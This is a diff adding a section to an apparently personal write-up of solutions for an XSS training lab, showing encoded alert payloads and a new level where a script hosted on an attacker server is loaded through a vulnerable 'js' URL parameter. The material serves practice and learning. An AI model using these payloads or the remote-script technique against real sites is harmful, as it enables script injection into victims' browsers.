@@ -96,6 +96,20 @@ http://untrusted.sudo.co.il/iframe.php?p=%27%3Bal%5Cu0065rt%28m%29%3B%2F%2F
 ';al\u0065rt`1`;//
 ```
 
+- 🧨 Level 13 — External Payload Injection
+
+first creat server for exploit and add in file js from server this pyload 
+
+```js
+alert(document.domain);
+```
+go add link for server like that format in web vurnirable
+
+```http
+http://www.sudo.co.il/xss/level14.php?js=https://exploit-servr.com/exploit
+```
+
+
 ---
 ## 👨‍💻 Author
 💻 Made with ❤️ by Bruno.
